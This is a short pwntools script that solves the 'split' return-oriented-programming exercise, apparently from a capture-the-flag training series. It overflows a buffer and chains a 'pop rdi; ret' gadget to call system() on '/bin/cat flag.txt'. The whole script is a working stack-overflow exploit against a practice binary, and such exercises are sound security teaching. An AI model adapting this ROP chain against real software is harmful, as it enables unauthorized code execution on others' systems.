from pwn import *

split = ELF('split')

# 0x004005e0    1 6            sym.imp.system

#  0x00400883                 5f  pop rdi
#  0x00400884                 c3  ret

# 000 0x00001060  vaddr -> 0x00601060  17  18 (.data) ascii /bin/cat flag.txt

rop_chain = "Z"*40              # ret overwrite
rop_chain += p64(0x00400883)    # pop rdi; ret
rop_chain += p64(0x00601060)    # string "/bin/cat flag.txt"
rop_chain += p64(0x004005e0)    # system()

p = process(split.path)
p.recvuntil('> ')
p.sendline(rop_chain)
flag = p.recv()
print ""
print flag
